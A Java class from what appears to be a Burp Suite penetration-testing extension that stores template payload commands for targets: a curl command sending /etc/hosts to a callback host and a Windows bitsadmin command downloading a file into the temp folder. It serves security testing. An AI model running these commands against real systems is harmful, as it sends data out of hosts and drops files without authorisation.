/*
	PayloadCommandFactory.java
	
	v0.1 (12/2/2015)
	
	Maintains a list of Hashtables containing skeleton commands to be run on a target system.
	
	Hashtable keys:
		cmd (command to run)
		os (operating system that command is intended for)
		prot (protocol used to talk back to node (http,ftp,smb,etc.)
		upload (whether command will upload a file (true) or simply access the context (false))

*/

package burp;

import java.util.Hashtable;
import java.util.ArrayList;
import java.util.Iterator;

public class PayloadCommandFactory {
	private ArrayList<Hashtable<String,String>> commands;
	
	//key constants
	private static final String[] HT_KEYS = {"cmd","os","prot","upload"};
	
	//default settings
	private static final String LINUX_OS = "Linux";
	private static final String WIN_OS = "Windows";
	private static final String LINUX_CURL_PASSWD = "curl -X PUT --data-binary @/etc/hosts [NODEPROTOCOL]://[NODEHOST]:[NODEPORT][NODEPATH]?token=[NODETOKEN]";
	private static final String WIN_BITSADMIN = "bitsadmin /transfer SuperSerialJob /download /priority high [NODEPROTOCOL]://[NODEHOST]:[NODEPORT][NODEPATH]?token=[NODETOKEN]&write=true C:\\Windows\\Temp\\superserial.txt"; //TODO: Add random string to job name (to avoid failed detection due to duplicate job names)
	private static final String LINUX_PING = "ping -c 4 [NODEHOST]"; //not used
	private static final String WIN_PING = "ping -n 4 [NODEHOST]"; //not used
	
	//default constructor: include only Linux curl and Windows bitsadmin commands
	public PayloadCommandFactory() {
		commands = new ArrayList<Hashtable<String,String>>(6);
		Hashtable<String,String> cmd = new Hashtable<String,String>(3);
		cmd.put(HT_KEYS[0],LINUX_CURL_PASSWD);
		cmd.put(HT_KEYS[1],LINUX_OS);
		cmd.put(HT_KEYS[2],"web");
		cmd.put(HT_KEYS[3],"true");
		commands.add(cmd);
		cmd = new Hashtable<String,String>(3);
		cmd.put(HT_KEYS[0],WIN_BITSADMIN);
		cmd.put(HT_KEYS[1],WIN_OS);
		cmd.put(HT_KEYS[2],"web");
		cmd.put(HT_KEYS[3],"false");
		commands.add(cmd);
	}
	
	//add custom command to payloadcommandfactory
	public void add(String c,String o,String p,boolean u) {
		Hashtable<String,String> cmd = new Hashtable<String,String>(3);
		cmd.put(HT_KEYS[0],c);
		cmd.put(HT_KEYS[1],o);
		cmd.put(HT_KEYS[2],p);
		cmd.put(HT_KEYS[3],Boolean.toString(u));
		commands.add(cmd);
	}
	
	//get iterator of command hashtables
	public Iterator<Hashtable<String,String>> iterator() {
		return commands.iterator();
	}
	
	//get array of command hashtables
	public Hashtable[] getCommandsArray() {
		Hashtable[] retArr = new Hashtable[commands.size()];
		return commands.toArray(retArr);
	}
}